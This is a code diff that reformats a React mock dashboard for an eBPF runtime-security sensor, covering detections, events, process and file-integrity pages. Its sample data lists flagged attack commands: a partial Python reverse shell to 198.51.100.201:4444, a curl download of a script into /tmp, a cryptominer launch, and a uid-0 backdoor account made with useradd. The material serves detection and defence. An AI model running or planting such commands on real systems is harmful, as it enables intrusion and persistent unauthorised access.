@@ -125,7 +125,14 @@ const detections: Detection[] = [
       pid: 980,
       cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 91fa…",
       user: "root",
-      children: [{ pid: 1012, cmd: "gunicorn payments.wsgi -w 4", user: "app", children: [{ pid: 22107, cmd: "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.201\",4444))'", user: "app", flagged: true }] }],
+      children: [
+        {
+          pid: 1012,
+          cmd: "gunicorn payments.wsgi -w 4",
+          user: "app",
+          children: [{ pid: 22107, cmd: "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.201\",4444))'", user: "app", flagged: true }],
+        },
+      ],
     },
   },
   {
@@ -140,7 +147,14 @@ const detections: Detection[] = [
       pid: 1,
       cmd: "/sbin/init",
       user: "root",
-      children: [{ pid: 812, cmd: "sshd: /usr/sbin/sshd -D", user: "root", children: [{ pid: 40211, cmd: "bash", user: "root", children: [{ pid: 40290, cmd: "useradd -o -u 0 backup2", user: "root", flagged: true }] }] }],
+      children: [
+        {
+          pid: 812,
+          cmd: "sshd: /usr/sbin/sshd -D",
+          user: "root",
+          children: [{ pid: 40211, cmd: "bash", user: "root", children: [{ pid: 40290, cmd: "useradd -o -u 0 backup2", user: "root", flagged: true }] }],
+        },
+      ],
     },
   },
   {
@@ -155,7 +169,14 @@ const detections: Detection[] = [
       pid: 1,
       cmd: "/sbin/init",
       user: "root",
-      children: [{ pid: 655, cmd: "/usr/bin/ansible-playbook site.yml", user: "root", children: [{ pid: 7712, cmd: "insmod /lib/modules/6.8.0/extra/nf_tap.ko", user: "root", flagged: true }] }],
+      children: [
+        {
+          pid: 655,
+          cmd: "/usr/bin/ansible-playbook site.yml",
+          user: "root",
+          children: [{ pid: 7712, cmd: "insmod /lib/modules/6.8.0/extra/nf_tap.ko", user: "root", flagged: true }],
+        },
+      ],
     },
   },
   {
@@ -170,7 +191,14 @@ const detections: Detection[] = [
       pid: 1,
       cmd: "/sbin/init",
       user: "root",
-      children: [{ pid: 3001, cmd: "tmux new -s debug", user: "chris", children: [{ pid: 3044, cmd: "bash", user: "chris", children: [{ pid: 3190, cmd: "sudo gdb -p 812", user: "root", flagged: true }] }] }],
+      children: [
+        {
+          pid: 3001,
+          cmd: "tmux new -s debug",
+          user: "chris",
+          children: [{ pid: 3044, cmd: "bash", user: "chris", children: [{ pid: 3190, cmd: "sudo gdb -p 812", user: "root", flagged: true }] }],
+        },
+      ],
     },
   },
 ];
@@ -214,13 +242,7 @@ const columns: Column<Detection>[] = [
 function ProcessTree({ node }: { node: ProcNode }) {
   return (
     <li className="flex flex-col">
-      <span
-        className={
-          node.flagged
-            ? "flex items-start gap-2 rounded bg-danger-soft px-1.5 py-1 text-danger-text"
-            : "flex items-start gap-2 px-1.5 py-1"
-        }
-      >
+      <span className={node.flagged ? "flex items-start gap-2 rounded bg-danger-soft px-1.5 py-1 text-danger-text" : "flex items-start gap-2 px-1.5 py-1"}>
         <span className="w-12 shrink-0 font-mono text-2xs text-fg-muted">{node.pid}</span>
         <span className="min-w-0 grow font-mono text-xs break-all">{node.cmd}</span>
         <span className="shrink-0 font-mono text-2xs text-fg-muted">{node.user}</span>
@@ -250,96 +272,96 @@ const perHour = hours.map((_, i) =>
 
 /** Runtime detections: events per hour, detections and the process tree of the selected one. */
 function DetectionsPage() {
-    const [range, setRange] = useState("24h");
-    const [sev, setSev] = useState<string[]>([]);
-    const [selected, setSelected] = useState("d2");
-    const rows = detections.filter((d) => sev.length === 0 || sev.includes(d.severity));
-    const current = detections.find((d) => d.id === selected);
-    return (
-      <>
-        <PageHeader
-          title="Detections"
-          description="eBPF sensor 0.14 on 46 hosts and 312 pods · 34 policies enforced"
-          meta={<StatusBadge tone="danger">2 critical open</StatusBadge>}
-          actions={
-            <>
-              <SearchInput label="Search detections, hosts or processes" className="w-72" />
-              <Button size="md" icon={<ScrollText />}>
-                Edit policies
-              </Button>
-            </>
-          }
+  const [range, setRange] = useState("24h");
+  const [sev, setSev] = useState<string[]>([]);
+  const [selected, setSelected] = useState("d2");
+  const rows = detections.filter((d) => sev.length === 0 || sev.includes(d.severity));
+  const current = detections.find((d) => d.id === selected);
+  return (
+    <>
+      <PageHeader
+        title="Detections"
+        description="eBPF sensor 0.14 on 46 hosts and 312 pods · 34 policies enforced"
+        meta={<StatusBadge tone="danger">2 critical open</StatusBadge>}
+        actions={
+          <>
+            <SearchInput label="Search detections, hosts or processes" className="w-72" />
+            <Button size="md" icon={<ScrollText />}>
+              Edit policies
+            </Button>
+          </>
+        }
+      />
+      <FilterBar>
+        <TimeRangePicker value={range} onChange={setRange} />
+        <FacetFilter
+          label="Severity"
+          selected={sev}
+          onChange={setSev}
+          options={(["critical", "high", "medium", "low"] as Severity[]).map((s) => ({
+            value: s,
+            label: SEVERITY_META[s].label,
+            count: detections.filter((d) => d.severity === s).length,
+          }))}
         />
-        <FilterBar>
-          <TimeRangePicker value={range} onChange={setRange} />
-          <FacetFilter
-            label="Severity"
-            selected={sev}
-            onChange={setSev}
-            options={(["critical", "high", "medium", "low"] as Severity[]).map((s) => ({
-              value: s,
-              label: SEVERITY_META[s].label,
-              count: detections.filter((d) => d.severity === s).length,
-            }))}
-          />
-        </FilterBar>
-        <KpiGrid>
-          <KpiCard label="Open detections" value="12" unit="last 24 h" tone="danger" delta={{ label: "+5 vs. yesterday", direction: "up", intent: "bad" }} />
-          <KpiCard label="Events · 24 h" value="2.31M" unit="exec, net, file" delta={{ label: "98.7% dropped by policy" }} />
-          <KpiCard label="Sensors reporting" value="46" unit="of 47 hosts" delta={{ label: "edge-lon-01 silent for 2 h", intent: "bad" }} />
-          <KpiCard label="FIM changes · 24 h" value="31" unit="files" delta={{ label: "1 outside change window", intent: "bad" }} />
-        </KpiGrid>
-        <Panel title="Events per hour" description="Matched rules, by severity">
-          <StackedBarChart
-            label="Runtime events per hour by severity"
-            categories={hours}
-            segments={sevOrder.map((s) => ({ id: s, name: SEVERITY_META[s].label, color: TONE_COLORS[SEVERITY_META[s].tone] }))}
-            values={perHour}
-            height={150}
-            xTicks={7}
+      </FilterBar>
+      <KpiGrid>
+        <KpiCard label="Open detections" value="12" unit="last 24 h" tone="danger" delta={{ label: "+5 vs. yesterday", direction: "up", intent: "bad" }} />
+        <KpiCard label="Events · 24 h" value="2.31M" unit="exec, net, file" delta={{ label: "98.7% dropped by policy" }} />
+        <KpiCard label="Sensors reporting" value="46" unit="of 47 hosts" delta={{ label: "edge-lon-01 silent for 2 h", intent: "bad" }} />
+        <KpiCard label="FIM changes · 24 h" value="31" unit="files" delta={{ label: "1 outside change window", intent: "bad" }} />
+      </KpiGrid>
+      <Panel title="Events per hour" description="Matched rules, by severity">
+        <StackedBarChart
+          label="Runtime events per hour by severity"
+          categories={hours}
+          segments={sevOrder.map((s) => ({ id: s, name: SEVERITY_META[s].label, color: TONE_COLORS[SEVERITY_META[s].tone] }))}
+          values={perHour}
+          height={150}
+          xTicks={7}
+        />
+      </Panel>
+      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(340px,2fr)]">
+        <Panel title="Detections" description="Select a row to see its process tree" flush>
+          <DataTable
+            label="Runtime detections"
+            columns={columns}
+            rows={rows}
+            getRowId={(d) => d.id}
+            onRowClick={(d) => setSelected(d.id)}
+            activeRowId={selected}
+            defaultSort={{ id: "time", direction: "desc" }}
+            minWidth={860}
           />
         </Panel>
-        <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(340px,2fr)]">
-          <Panel title="Detections" description="Select a row to see its process tree" flush>
-            <DataTable
-              label="Runtime detections"
-              columns={columns}
-              rows={rows}
-              getRowId={(d) => d.id}
-              onRowClick={(d) => setSelected(d.id)}
-              activeRowId={selected}
-              defaultSort={{ id: "time", direction: "desc" }}
-              minWidth={860}
-            />
-          </Panel>
-          <Panel
-            title="Process tree"
-            description={current ? `${current.title} · ${current.host}` : "No detection selected"}
-            actions={current && <Badge mono>{current.rule}</Badge>}
-            aria-label="Process tree"
-          >
-            {current ? (
-              <div className="flex flex-col gap-2">
-                <ul aria-label={`Process tree for ${current.title}`} className="flex flex-col text-sm">
-                  <ProcessTree node={current.tree} />
-                </ul>
-                <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
-                  <Button size="sm" variant="danger">
-                    Kill process
-                  </Button>
-                  <Button size="sm">Isolate host</Button>
-                  <Button size="sm" variant="ghost">
-                    Open in SIEM
-                  </Button>
-                </div>
+        <Panel
+          title="Process tree"
+          description={current ? `${current.title} · ${current.host}` : "No detection selected"}
+          actions={current && <Badge mono>{current.rule}</Badge>}
+          aria-label="Process tree"
+        >
+          {current ? (
+            <div className="flex flex-col gap-2">
+              <ul aria-label={`Process tree for ${current.title}`} className="flex flex-col text-sm">
+                <ProcessTree node={current.tree} />
+              </ul>
+              <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
+                <Button size="sm" variant="danger">
+                  Kill process
+                </Button>
+                <Button size="sm">Isolate host</Button>
+                <Button size="sm" variant="ghost">
+                  Open in SIEM
+                </Button>
               </div>
-            ) : (
-              <p className="py-6 text-center text-sm text-fg-muted">Select a detection</p>
-            )}
-          </Panel>
-        </div>
-      </>
-    );
+            </div>
+          ) : (
+            <p className="py-6 text-center text-sm text-fg-muted">Select a detection</p>
+          )}
+        </Panel>
+      </div>
+    </>
+  );
 }
 
 /* ------------------------------------------------------------------ */
@@ -363,18 +385,158 @@ interface RtEvent {
 }
 
 const EVENTS: RtEvent[] = [
-  { id: "e1", ts: "13:58:12.418", kind: "exec", host: "worker-prod-04", container: "orders-api-6f9c7d", pid: 30551, user: "app", summary: "/bin/sh -c id; uname -a", rule: "container.shell_spawned", action: "alerted", fields: { "proc.ppid": 4188, "proc.parent": "node", "proc.exe": "/bin/sh", "container.image": "registry.example.com/orders-api:2.14.1", "k8s.ns": "orders" } },
-  { id: "e2", ts: "13:58:12.420", kind: "exec", host: "worker-prod-04", container: "orders-api-6f9c7d", pid: 30552, user: "app", summary: "id", action: "allowed", fields: { "proc.ppid": 30551, "proc.parent": "sh", "proc.exe": "/usr/bin/id", "k8s.ns": "orders" } },
-  { id: "e3", ts: "13:57:40.002", kind: "network", host: "api-prod-03", container: "payments-api-55b8", pid: 1012, user: "app", summary: "connect 10.20.4.17:5432 tcp", action: "allowed", fields: { "net.dst": "10.20.4.17", "net.dport": 5432, "net.proto": "tcp", "k8s.ns": "payments" } },
-  { id: "e4", ts: "13:56:03.771", kind: "file", host: "db-prod-01", pid: 2201, user: "postgres", summary: "write /var/lib/postgresql/16/main/pg_wal/0000000100000A2F", action: "allowed", fields: { "fd.name": "/var/lib/postgresql/16/main/pg_wal/0000000100000A2F", "evt.type": "openat", "fd.flags": "O_WRONLY" } },
-  { id: "e5", ts: "13:41:07.130", kind: "exec", host: "worker-prod-09", container: "reports-cron-28831", pid: 18840, user: "app", summary: "/tmp/.x/kworker -o 198.51.100.201:3333", rule: "proc.cryptominer_exec", action: "blocked", fields: { "proc.ppid": 18803, "proc.exe": "/tmp/.x/kworker", "proc.sha256": "9f2c…e81a", "k8s.ns": "reports" } },
-  { id: "e6", ts: "13:41:06.904", kind: "network", host: "worker-prod-09", container: "reports-cron-28831", pid: 18803, user: "app", summary: "connect 203.0.113.181:80 tcp", rule: "net.outbound_untrusted", action: "alerted", fields: { "net.dst": "203.0.113.181", "net.dport": 80, "net.proto": "tcp", "k8s.ns": "reports" } },
-  { id: "e7", ts: "13:22:45.511", kind: "network", host: "api-prod-03", container: "payments-api-55b8", pid: 22107, user: "app", summary: "connect 198.51.100.201:4444 tcp", rule: "net.outbound_unexpected_port", action: "alerted", fields: { "net.dst": "198.51.100.201", "net.dport": 4444, "net.proto": "tcp", "k8s.ns": "payments" } },
-  { id: "e8", ts: "12:57:30.090", kind: "file", host: "db-prod-02", pid: 40290, user: "root", summary: "write /etc/passwd", rule: "fim.sensitive_file_write", action: "alerted", fields: { "fd.name": "/etc/passwd", "evt.type": "rename", "proc.name": "useradd" } },
-  { id: "e9", ts: "11:15:02.664", kind: "kernel", host: "edge-fra-02", pid: 7712, user: "root", summary: "init_module nf_tap", rule: "kernel.module_load", action: "alerted", fields: { "evt.type": "finit_module", "module.name": "nf_tap", "module.signed": "no" } },
-  { id: "e10", ts: "10:49:51.208", kind: "kernel", host: "api-prod-01", pid: 3190, user: "root", summary: "ptrace PTRACE_ATTACH pid 812", rule: "proc.ptrace_attach", action: "alerted", fields: { "evt.type": "ptrace", "ptrace.target": 812, "ptrace.target_name": "sshd" } },
-  { id: "e11", ts: "10:12:18.355", kind: "exec", host: "api-prod-05", container: "search-api-77d1", pid: 912, user: "app", summary: "java -jar /app/search.jar", action: "allowed", fields: { "proc.ppid": 1, "proc.exe": "/usr/bin/java", "k8s.ns": "search" } },
-  { id: "e12", ts: "09:40:02.017", kind: "file", host: "edge-fra-02", pid: 1840, user: "root", summary: "write /etc/nginx/conf.d/edge.conf", action: "allowed", fields: { "fd.name": "/etc/nginx/conf.d/edge.conf", "evt.type": "openat", "proc.name": "ansible" } },
+  {
+    id: "e1",
+    ts: "13:58:12.418",
+    kind: "exec",
+    host: "worker-prod-04",
+    container: "orders-api-6f9c7d",
+    pid: 30551,
+    user: "app",
+    summary: "/bin/sh -c id; uname -a",
+    rule: "container.shell_spawned",
+    action: "alerted",
+    fields: {
+      "proc.ppid": 4188,
+      "proc.parent": "node",
+      "proc.exe": "/bin/sh",
+      "container.image": "registry.example.com/orders-api:2.14.1",
+      "k8s.ns": "orders",
+    },
+  },
+  {
+    id: "e2",
+    ts: "13:58:12.420",
+    kind: "exec",
+    host: "worker-prod-04",
+    container: "orders-api-6f9c7d",
+    pid: 30552,
+    user: "app",
+    summary: "id",
+    action: "allowed",
+    fields: { "proc.ppid": 30551, "proc.parent": "sh", "proc.exe": "/usr/bin/id", "k8s.ns": "orders" },
+  },
+  {
+    id: "e3",
+    ts: "13:57:40.002",
+    kind: "network",
+    host: "api-prod-03",
+    container: "payments-api-55b8",
+    pid: 1012,
+    user: "app",
+    summary: "connect 10.20.4.17:5432 tcp",
+    action: "allowed",
+    fields: { "net.dst": "10.20.4.17", "net.dport": 5432, "net.proto": "tcp", "k8s.ns": "payments" },
+  },
+  {
+    id: "e4",
+    ts: "13:56:03.771",
+    kind: "file",
+    host: "db-prod-01",
+    pid: 2201,
+    user: "postgres",
+    summary: "write /var/lib/postgresql/16/main/pg_wal/0000000100000A2F",
+    action: "allowed",
+    fields: { "fd.name": "/var/lib/postgresql/16/main/pg_wal/0000000100000A2F", "evt.type": "openat", "fd.flags": "O_WRONLY" },
+  },
+  {
+    id: "e5",
+    ts: "13:41:07.130",
+    kind: "exec",
+    host: "worker-prod-09",
+    container: "reports-cron-28831",
+    pid: 18840,
+    user: "app",
+    summary: "/tmp/.x/kworker -o 198.51.100.201:3333",
+    rule: "proc.cryptominer_exec",
+    action: "blocked",
+    fields: { "proc.ppid": 18803, "proc.exe": "/tmp/.x/kworker", "proc.sha256": "9f2c…e81a", "k8s.ns": "reports" },
+  },
+  {
+    id: "e6",
+    ts: "13:41:06.904",
+    kind: "network",
+    host: "worker-prod-09",
+    container: "reports-cron-28831",
+    pid: 18803,
+    user: "app",
+    summary: "connect 203.0.113.181:80 tcp",
+    rule: "net.outbound_untrusted",
+    action: "alerted",
+    fields: { "net.dst": "203.0.113.181", "net.dport": 80, "net.proto": "tcp", "k8s.ns": "reports" },
+  },
+  {
+    id: "e7",
+    ts: "13:22:45.511",
+    kind: "network",
+    host: "api-prod-03",
+    container: "payments-api-55b8",
+    pid: 22107,
+    user: "app",
+    summary: "connect 198.51.100.201:4444 tcp",
+    rule: "net.outbound_unexpected_port",
+    action: "alerted",
+    fields: { "net.dst": "198.51.100.201", "net.dport": 4444, "net.proto": "tcp", "k8s.ns": "payments" },
+  },
+  {
+    id: "e8",
+    ts: "12:57:30.090",
+    kind: "file",
+    host: "db-prod-02",
+    pid: 40290,
+    user: "root",
+    summary: "write /etc/passwd",
+    rule: "fim.sensitive_file_write",
+    action: "alerted",
+    fields: { "fd.name": "/etc/passwd", "evt.type": "rename", "proc.name": "useradd" },
+  },
+  {
+    id: "e9",
+    ts: "11:15:02.664",
+    kind: "kernel",
+    host: "edge-fra-02",
+    pid: 7712,
+    user: "root",
+    summary: "init_module nf_tap",
+    rule: "kernel.module_load",
+    action: "alerted",
+    fields: { "evt.type": "finit_module", "module.name": "nf_tap", "module.signed": "no" },
+  },
+  {
+    id: "e10",
+    ts: "10:49:51.208",
+    kind: "kernel",
+    host: "api-prod-01",
+    pid: 3190,
+    user: "root",
+    summary: "ptrace PTRACE_ATTACH pid 812",
+    rule: "proc.ptrace_attach",
+    action: "alerted",
+    fields: { "evt.type": "ptrace", "ptrace.target": 812, "ptrace.target_name": "sshd" },
+  },
+  {
+    id: "e11",
+    ts: "10:12:18.355",
+    kind: "exec",
+    host: "api-prod-05",
+    container: "search-api-77d1",
+    pid: 912,
+    user: "app",
+    summary: "java -jar /app/search.jar",
+    action: "allowed",
+    fields: { "proc.ppid": 1, "proc.exe": "/usr/bin/java", "k8s.ns": "search" },
+  },
+  {
+    id: "e12",
+    ts: "09:40:02.017",
+    kind: "file",
+    host: "edge-fra-02",
+    pid: 1840,
+    user: "root",
+    summary: "write /etc/nginx/conf.d/edge.conf",
+    action: "allowed",
+    fields: { "fd.name": "/etc/nginx/conf.d/edge.conf", "evt.type": "openat", "proc.name": "ansible" },
+  },
 ];
 
 const KIND_TONE = { exec: "info", network: "neutral", file: "warning", kernel: "danger" } as const;
@@ -386,22 +548,51 @@ function EventsPage() {
   const [draft, setDraft] = useState("");
   const [query, setQuery] = useState("");
   const [active, setActive] = useState<string | undefined>("e5");
-  const rows = EVENTS.filter((e) => (kind === "all" || e.kind === kind) && (!query || `${e.host} ${e.summary} ${e.rule ?? ""} ${e.container ?? ""}`.toLowerCase().includes(query.toLowerCase())));
+  const rows = EVENTS.filter(
+    (e) =>
+      (kind === "all" || e.kind === kind) &&
+      (!query || `${e.host} ${e.summary} ${e.rule ?? ""} ${e.container ?? ""}`.toLowerCase().includes(query.toLowerCase())),
+  );
   const cur = EVENTS.find((e) => e.id === active);
   const cols: Column<RtEvent>[] = [
     { id: "ts", header: "Time", mono: true, width: "110px", sortValue: (e) => e.ts, cell: (e) => e.ts },
     { id: "kind", header: "Type", width: "90px", cell: (e) => <Badge tone={KIND_TONE[e.kind]}>{e.kind}</Badge> },
     { id: "host", header: "Host", cell: (e) => <EntityChip kind="host" value={e.host} hideKind /> },
     { id: "pid", header: "PID", mono: true, align: "right", width: "70px", cell: (e) => e.pid },
-    { id: "summary", header: "Event", width: "34%", cell: (e) => <span className="block truncate font-mono text-xs" title={e.summary}>{e.summary}</span> },
-    { id: "action", header: "Result", width: "90px", description: "Allowed events matched no rule; alerted ones raised a detection; blocked ones were stopped by an enforce-mode policy.", cell: (e) => <Badge tone={ACTION_TONE[e.action]}>{e.action}</Badge> },
+    {
+      id: "summary",
+      header: "Event",
+      width: "34%",
+      cell: (e) => (
+        <span className="block truncate font-mono text-xs" title={e.summary}>
+          {e.summary}
+        </span>
+      ),
+    },
+    {
+      id: "action",
+      header: "Result",
+      width: "90px",
+      description: "Allowed events matched no rule; alerted ones raised a detection; blocked ones were stopped by an enforce-mode policy.",
+      cell: (e) => <Badge tone={ACTION_TONE[e.action]}>{e.action}</Badge>,
+    },
   ];
   return (
     <>
-      <PageHeader title="Events" description="Raw syscall-level events from the eBPF sensor. 98.7% are dropped at the edge by policy; these are the kept ones." />
+      <PageHeader
+        title="Events"
+        description="Raw syscall-level events from the eBPF sensor. 98.7% are dropped at the edge by policy; these are the kept ones."
+      />
       <FilterBar onClear={query || kind !== "all" ? () => (setQuery(""), setDraft(""), setKind("all")) : undefined}>
         <TimeRangePicker value={range} onChange={setRange} />
-        <QueryBar value={draft} onChange={setDraft} onSubmit={setQuery} placeholder="host:api-prod-03 or /etc/passwd" label="Search events" className="min-w-64 grow" />
+        <QueryBar
+          value={draft}
+          onChange={setDraft}
+          onSubmit={setQuery}
+          placeholder="host:api-prod-03 or /etc/passwd"
+          label="Search events"
+          className="min-w-64 grow"
+        />
       </FilterBar>
       <Tabs
         label="Event type"
@@ -417,7 +608,17 @@ function EventsPage() {
       />
       <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
         <Panel title="Events" description={`${rows.length} events`} flush>
-          <DataTable label="Runtime events" columns={cols} rows={rows} getRowId={(e) => e.id} onRowClick={(e) => setActive(e.id)} activeRowId={active} defaultSort={{ id: "ts", direction: "desc" }} minWidth={820} empty={<p className="py-8">No events match</p>} />
+          <DataTable
+            label="Runtime events"
+            columns={cols}
+            rows={rows}
+            getRowId={(e) => e.id}
+            onRowClick={(e) => setActive(e.id)}
+            activeRowId={active}
+            defaultSort={{ id: "ts", direction: "desc" }}
+            minWidth={820}
+            empty={<p className="py-8">No events match</p>}
+          />
         </Panel>
         <Panel title="Event fields" description={cur ? `${cur.kind} · ${cur.ts}` : "No event selected"} aria-label="Event fields">
           {cur ? (
@@ -477,18 +678,97 @@ const PROCS: Record<string, Proc[]> = {
   "worker-prod-09": [
     { pid: 1, ppid: 0, cmd: "/sbin/init", user: "root", cpu: 0, memMb: 12, started: "41 d ago", baseline: "known" },
     { pid: 702, ppid: 1, cmd: "/usr/bin/containerd", user: "root", cpu: 0.8, memMb: 96, started: "41 d ago", baseline: "known" },
-    { pid: 731, ppid: 1, cmd: "/usr/bin/kubelet --config=/var/lib/kubelet/config.yaml", user: "root", cpu: 2.1, memMb: 148, started: "41 d ago", baseline: "known" },
-    { pid: 2264, ppid: 2210, cmd: "sh -c /opt/reports/run.sh", user: "app", cpu: 0, memMb: 2, started: "13:40", baseline: "known", container: "reports-cron-28831" },
-    { pid: 18803, ppid: 2264, cmd: "curl -fsSL http://203.0.113.181/x.sh -o /tmp/.x/k", user: "app", cpu: 0, memMb: 6, started: "13:41", baseline: "new", container: "reports-cron-28831" },
-    { pid: 18840, ppid: 18803, cmd: "/tmp/.x/kworker -o 198.51.100.201:3333 --donate-level 0", user: "app", cpu: 0, memMb: 0, started: "13:41 · killed", baseline: "new", container: "reports-cron-28831" },
-    { pid: 3302, ppid: 702, cmd: "python3 -m celery worker -A reports", user: "app", cpu: 14.6, memMb: 612, started: "2 d ago", baseline: "known", container: "reports-worker-4b2" },
-    { pid: 3360, ppid: 3302, cmd: "python3 -m celery worker -A reports --pool=prefork", user: "app", cpu: 9.2, memMb: 388, started: "2 d ago", baseline: "drift", container: "reports-worker-4b2" },
+    {
+      pid: 731,
+      ppid: 1,
+      cmd: "/usr/bin/kubelet --config=/var/lib/kubelet/config.yaml",
+      user: "root",
+      cpu: 2.1,
+      memMb: 148,
+      started: "41 d ago",
+      baseline: "known",
+    },
+    {
+      pid: 2264,
+      ppid: 2210,
+      cmd: "sh -c /opt/reports/run.sh",
+      user: "app",
+      cpu: 0,
+      memMb: 2,
+      started: "13:40",
+      baseline: "known",
+      container: "reports-cron-28831",
+    },
+    {
+      pid: 18803,
+      ppid: 2264,
+      cmd: "curl -fsSL http://203.0.113.181/x.sh -o /tmp/.x/k",
+      user: "app",
+      cpu: 0,
+      memMb: 6,
+      started: "13:41",
+      baseline: "new",
+      container: "reports-cron-28831",
+    },
+    {
+      pid: 18840,
+      ppid: 18803,
+      cmd: "/tmp/.x/kworker -o 198.51.100.201:3333 --donate-level 0",
+      user: "app",
+      cpu: 0,
+      memMb: 0,
+      started: "13:41 · killed",
+      baseline: "new",
+      container: "reports-cron-28831",
+    },
+    {
+      pid: 3302,
+      ppid: 702,
+      cmd: "python3 -m celery worker -A reports",
+      user: "app",
+      cpu: 14.6,
+      memMb: 612,
+      started: "2 d ago",
+      baseline: "known",
+      container: "reports-worker-4b2",
+    },
+    {
+      pid: 3360,
+      ppid: 3302,
+      cmd: "python3 -m celery worker -A reports --pool=prefork",
+      user: "app",
+      cpu: 9.2,
+      memMb: 388,
+      started: "2 d ago",
+      baseline: "drift",
+      container: "reports-worker-4b2",
+    },
     { pid: 990, ppid: 1, cmd: "/opt/openasy/sensor --mode=ebpf", user: "root", cpu: 1.4, memMb: 74, started: "6 d ago", baseline: "known" },
   ],
   "api-prod-03": [
     { pid: 1, ppid: 0, cmd: "/sbin/init", user: "root", cpu: 0, memMb: 11, started: "18 d ago", baseline: "known" },
-    { pid: 1012, ppid: 980, cmd: "gunicorn payments.wsgi -w 4", user: "app", cpu: 22.4, memMb: 840, started: "3 d ago", baseline: "known", container: "payments-api-55b8" },
-    { pid: 22107, ppid: 1012, cmd: "python3 -c 'import socket,os;s=socket.socket()…'", user: "app", cpu: 0.1, memMb: 9, started: "13:22", baseline: "new", container: "payments-api-55b8" },
+    {
+      pid: 1012,
+      ppid: 980,
+      cmd: "gunicorn payments.wsgi -w 4",
+      user: "app",
+      cpu: 22.4,
+      memMb: 840,
+      started: "3 d ago",
+      baseline: "known",
+      container: "payments-api-55b8",
+    },
+    {
+      pid: 22107,
+      ppid: 1012,
+      cmd: "python3 -c 'import socket,os;s=socket.socket()…'",
+      user: "app",
+      cpu: 0.1,
+      memMb: 9,
+      started: "13:22",
+      baseline: "new",
+      container: "payments-api-55b8",
+    },
     { pid: 1188, ppid: 1, cmd: "/usr/sbin/sshd -D", user: "root", cpu: 0, memMb: 6, started: "18 d ago", baseline: "known" },
     { pid: 990, ppid: 1, cmd: "/opt/openasy/sensor --mode=ebpf", user: "root", cpu: 1.1, memMb: 70, started: "6 d ago", baseline: "known" },
   ],
@@ -505,12 +785,31 @@ function ProcessesPage() {
   const cols: Column<Proc>[] = [
     { id: "pid", header: "PID", mono: true, align: "right", width: "70px", sortValue: (p) => p.pid, cell: (p) => p.pid },
     { id: "ppid", header: "PPID", mono: true, align: "right", width: "70px", cell: (p) => p.ppid },
-    { id: "cmd", header: "Command", width: "38%", cell: (p) => <span className="block truncate font-mono text-xs" title={p.cmd}>{p.cmd}</span> },
+    {
+      id: "cmd",
+      header: "Command",
+      width: "38%",
+      cell: (p) => (
+        <span className="block truncate font-mono text-xs" title={p.cmd}>
+          {p.cmd}
+        </span>
+      ),
+    },
     { id: "user", header: "User", mono: true, width: "70px", cell: (p) => p.user },
-    { id: "container", header: "Container", cell: (p) => (p.container ? <EntityChip kind="container" value={p.container} hideKind /> : <span className="text-fg-subtle">host</span>) },
+    {
+      id: "container",
+      header: "Container",
+      cell: (p) => (p.container ? <EntityChip kind="container" value={p.container} hideKind /> : <span className="text-fg-subtle">host</span>),
+    },
     { id: "cpu", header: "CPU %", align: "right", mono: true, sortValue: (p) => p.cpu, cell: (p) => p.cpu.toFixed(1) },
     { id: "mem", header: "Memory", align: "right", mono: true, sortValue: (p) => p.memMb, cell: (p) => `${p.memMb} MB` },
-    { id: "baseline", header: "Baseline", description: "Compared to the 14-day learned baseline for this workload. New: never seen. Drift: known binary with new arguments or parent.", sortValue: (p) => p.baseline, cell: (p) => <Badge tone={BASELINE_TONE[p.baseline]}>{p.baseline}</Badge> },
+    {
+      id: "baseline",
+      header: "Baseline",
+      description: "Compared to the 14-day learned baseline for this workload. New: never seen. Drift: known binary with new arguments or parent.",
+      sortValue: (p) => p.baseline,
+      cell: (p) => <Badge tone={BASELINE_TONE[p.baseline]}>{p.baseline}</Badge>,
+    },
     {
       id: "act",
       header: "",
@@ -569,14 +868,102 @@ interface FimChange {
 }
 
 const FIM: FimChange[] = [
-  { id: "f1", path: "/etc/passwd", host: "db-prod-02", change: "modified", by: "useradd (root via sshd)", when: "12:57", before: "sha256:4e1a…90c2", after: "sha256:b77d…13fe", inWindow: false, status: "unreviewed" },
-  { id: "f2", path: "/etc/shadow", host: "db-prod-02", change: "modified", by: "useradd (root via sshd)", when: "12:57", before: "sha256:0c33…a1d4", after: "sha256:fe02…7b19", inWindow: false, status: "unreviewed" },
-  { id: "f3", path: "/etc/nginx/conf.d/edge.conf", host: "edge-fra-02", change: "modified", by: "ansible-playbook (CHG-2291)", when: "09:40", before: "sha256:9a10…55e0", after: "sha256:12bc…d0aa", inWindow: true, status: "approved" },
-  { id: "f4", path: "/usr/local/bin/backup.sh", host: "db-prod-01", change: "permissions", by: "chmod 4755 (root)", when: "08:12", before: "0755 root:root", after: "4755 root:root", inWindow: false, status: "unreviewed" },
-  { id: "f5", path: "/etc/ssh/sshd_config", host: "api-prod-01", change: "modified", by: "ansible-playbook (CHG-2288)", when: "Yesterday 22:04", before: "sha256:77e1…0b3c", after: "sha256:a4f0…c912", inWindow: true, status: "approved" },
-  { id: "f6", path: "/lib/modules/6.8.0/extra/nf_tap.ko", host: "edge-fra-02", change: "created", by: "ansible-playbook (CHG-2291)", when: "11:15", before: "–", after: "sha256:d1c8…4e77", inWindow: true, status: "unreviewed" },
-  { id: "f7", path: "/root/.ssh/authorized_keys", host: "worker-prod-04", change: "modified", by: "bash (root)", when: "Yesterday 03:18", before: "sha256:3b9d…e004", after: "sha256:6f21…aa80", inWindow: false, status: "incident" },
-  { id: "f8", path: "/etc/cron.d/logrotate", host: "api-prod-05", change: "deleted", by: "apt-get (unattended-upgrades)", when: "Yesterday 06:30", before: "sha256:8810…f2b5", after: "–", inWindow: true, status: "approved" },
+  {
+    id: "f1",
+    path: "/etc/passwd",
+    host: "db-prod-02",
+    change: "modified",
+    by: "useradd (root via sshd)",
+    when: "12:57",
+    before: "sha256:4e1a…90c2",
+    after: "sha256:b77d…13fe",
+    inWindow: false,
+    status: "unreviewed",
+  },
+  {
+    id: "f2",
+    path: "/etc/shadow",
+    host: "db-prod-02",
+    change: "modified",
+    by: "useradd (root via sshd)",
+    when: "12:57",
+    before: "sha256:0c33…a1d4",
+    after: "sha256:fe02…7b19",
+    inWindow: false,
+    status: "unreviewed",
+  },
+  {
